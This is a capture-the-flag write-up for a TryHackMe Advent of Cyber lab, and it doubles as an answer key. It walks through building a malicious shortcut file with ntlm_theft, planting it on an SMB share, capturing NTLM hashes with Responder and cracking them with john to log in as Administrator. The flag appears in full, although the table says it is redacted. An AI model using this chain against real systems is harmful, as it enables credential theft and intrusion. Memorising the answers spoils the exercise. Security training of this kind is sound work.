# Advent of Cyber 2023 - Day 23: Relay All the Way

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Overview & Investigation Walkthrough

In this task we will be looking at coercing authentication techniques using Responder to get NTLM hashes from users we can crack to gain access to the server.

1. What is the name of the AD authentication protocol that makes use of tickets?

   The answer to this question can be found in the text.

   ><details><summary>Click for answer</summary>Kerberos</details>

2. What is the name of the AD authentication protocol that makes use of the NTLM hash?

   The answer to this question can be found in the text.

   ><details><summary>Click for answer</summary>NetNTLM</details>

3. What is the name of the tool that can intercept these authentication challenges?

   The answer to this question can be found in the text.

   ><details><summary>Click for answer</summary>Responder</details>

4. What is the password that McGreedy set for the Administrator account?

   Lets first create our NTLM hash theft file using `ntlm_theft` found [here](https://github.com/Greenwolf/ntlm_theft).

   ```cmd
   python3 ntlm_theft.py -g lnk -s 10.18.78.136 -f stealthy
   ```

   ![D23 Create File](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Create_File.png)

   Now we can transfer this file to the share using `smbclient`.

   ```cmd
   smbclient //10.10.114.211/ElfShare/ -U guest%
   put stealthy.lnk
   dir
   ```

   ![D23 Transfer File](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Transfer_File.png)

   Now we must start responder so it can listen for any received on our machine.

   ```cmd
   sudo responder -I tun0
   or
   responder -I ens5
   ```

   ![D23 Responder Start](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Responder_Start.png)

   After waiting a little while we get a hit. The request contains the NTLM hash that could lead us to the password of the server.

   ![D23 Responder Intercept](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Responder_Intercept.png)

   Lets download the password list from the share to use as our wordlist.

   ```cmd
   get greedykeys.txt
   ```

   ![D23 Password List](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Password_List.png)

   After adding the intercepted hash to a file, we can use `john` to crack the NTLM password.

   ```cmd
   john --wordlist=ntlm_theft/stealthy/greedykeys.txt hash.txt
   ```

   ![D23 Password](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Password.png)

   ><details><summary>Click for answer</summary>GreedyGrabber1</details>

5. What is the value of the flag that is placed on the Administrator’s desktop?

   Now that we have the password belonging to the Administrator account, we can RDP into the server using Remmina.

   On the desktop we can find our flag.

   ![D23 Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D23_Flag.png)

   ><details><summary>Click for answer</summary>THM{Greedy.Greedy.McNot.So.Great.Stealy}</details>

If you enjoyed this task, feel free to check out the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) module!

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the name of the AD authentication protocol that makes use of tickets? | `Kerberos` |
| What is the name of the AD authentication protocol that makes use of the NTLM hash? | `NetNTLM` |
| What is the name of the tool that can intercept these authentication challenges? | `Responder` |
| What is the password that McGreedy set for the Administrator account? | `GreedyGrabber1` |
| What is the value of the flag that is placed on the Administrator’s desktop? | `flag{hidden}` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
